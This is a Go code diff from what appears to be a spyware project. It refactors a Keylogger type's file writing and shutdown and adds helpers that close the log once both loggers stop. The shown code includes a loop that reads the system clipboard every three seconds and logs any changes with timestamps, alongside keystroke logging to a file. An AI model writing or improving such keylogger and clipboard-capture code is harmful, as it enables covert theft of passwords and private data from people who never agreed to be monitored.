@@ -7,6 +7,7 @@ import (
 	"time"
 
 	"github.com/atotto/clipboard"
+	"github.com/cinus-e/spy/internal/literr"
 	"github.com/cinus-e/spy/internal/util"
 )
 
@@ -39,10 +40,9 @@ func (l *Keylogger) RunKeyboardLogger() {
 		if text == "" {
 			continue
 		}
-		if _, err := l.file.Write([]byte(text)); err != nil {
-			fmt.Println(err)
-		}
+		l.write(text)
 	}
+	l.fileClose()
 }
 
 func (l *Keylogger) RunClipboardLogger() {
@@ -53,17 +53,30 @@ func (l *Keylogger) RunClipboardLogger() {
 	for l.isClipboardLogging {
 		text, _ := clipboard.ReadAll()
 		if text != tmp {
-			if _, err := l.file.Write([]byte(fmt.Sprintf("\n%s[Clipboard]\n%s\n", util.Now(), text))); err != nil {
-				fmt.Println(err)
-			}
+			l.write(fmt.Sprintf("\n%s[Clipboard]\n%s\n", util.Now(), text))
 			tmp = text
 		}
 		time.Sleep(3 * time.Second)
 	}
+	l.fileClose()
+}
+
+func (l *Keylogger) write(text string) {
+	if l.file != nil {
+		if _, err := l.file.Write([]byte(text)); err != nil {
+			literr.CheckError(err)
+		}
+	}
+}
+
+func (l *Keylogger) fileClose() {
+	if l.isKeyboardLogging == false && l.isClipboardLogging == false {
+		_ = l.file.Close()
+		l.file = nil
+	}
 }
 
 func (l *Keylogger) Close() {
+	l.isKeyboardLogging = false
 	l.isClipboardLogging = false
-	l.isClipboardLogging = false
-	_ = l.file.Close()
 }
